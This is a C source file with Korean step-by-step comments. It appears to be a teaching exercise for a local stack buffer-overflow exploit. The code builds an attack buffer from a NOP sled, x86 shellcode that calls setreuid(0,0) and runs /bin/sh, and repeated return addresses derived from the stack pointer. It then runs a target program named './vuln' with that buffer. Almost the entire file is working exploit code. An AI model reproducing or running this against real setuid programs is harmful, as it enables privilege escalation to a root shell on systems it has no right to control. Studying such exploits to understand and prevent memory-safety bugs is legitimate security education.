#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
	"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
	"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
	"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
	"\x68";

// 스택 포인터를 리턴하는 함수
unsigned long sp(void)
{
	__asm__("movl %esp, %eax");
}

int main (int argc, char * argv[])
{
	int i, offset;
	long esp, ret, *addr_ptr;
	char *buffer, *ptr;

	// STEP 1. 스택 포인터를 가져온 다음 거기에서 오프셋 값을 뺀다. 
	offset = 0;   // offset 0을 사용한다.
	esp = sp();   // 현재 스택포인터를 esp 에 저장한다.
	ret = esp - offset;  // 우리를 리턴 주소를 덮어쓰고 싶다.

	printf("Stack pinter (ESP) : 0x%x\n", esp);
	printf("Offest from ESP : 0x%x\n", offset);
	printf("Desired Return Addr : 0x%x\n", ret);

	// STEP 2. 공격 버퍼를 위한 메모리 600 바이트를 힙에 할당한다.
	buffer = malloc(600);
	
	// STEP 3. 공격 버퍼 전체를 리턴 주소로 채운다.
	ptr = buffer;
	addr_ptr = (long *) ptr;
	for(i=0; i < 600; i+=4){
		*(addr_ptr++) = ret;
	}
	
	// STEP 4.  버퍼의 처음 200 바이트를 NOP 명령으로 채운다.
	for(i=0; i < 200; i++){
		buffer[i] = '\x90';
	}

	// STEP 5. 셸코드를 NOP 썰매 다음에 둔다.
	ptr = buffer + 200;
	for (i=0; i < strlen(shellcode); i++){
		*(ptr++) = shellcode[i];
	}
	
	// STEP 6. 공격 버퍼의 맨 마지막을 Null 바이트로 설정한다.
	buffer[600-1] = 0;
	
	// STEP 7. 이제 우리가 만든 버퍼를 인자로 주고 ./vuln 프로그램을 실행한다.
	execl("./vuln", "vuln", buffer, 0);

	// STEP 8. 버퍼 메모리를 지운다.
	free(buffer);
	return 0;
}

		
	
	
		
	
	
	
	
	
	
	
